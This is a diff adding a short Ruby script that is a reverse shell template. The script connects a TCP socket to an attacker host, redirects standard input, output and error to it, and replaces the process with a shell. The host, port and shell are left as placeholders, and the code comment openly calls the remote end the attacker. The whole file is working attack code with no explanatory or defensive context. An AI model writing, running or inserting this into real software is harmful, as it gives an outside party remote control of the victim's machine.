@@ -1,0 +1,12 @@
+require "socket"
+
+# Open a new socket and connect to the attacker
+sock = TCPSocket.new("*\host*", *\port*)
+
+# Redirect STDIN, STDOUT, and STDERR to the socket
+STDIN.reopen(sock)
+STDOUT.reopen(sock)
+STDERR.reopen(sock)
+
+# Replace the current process with the shell
+exec "*\shell*"
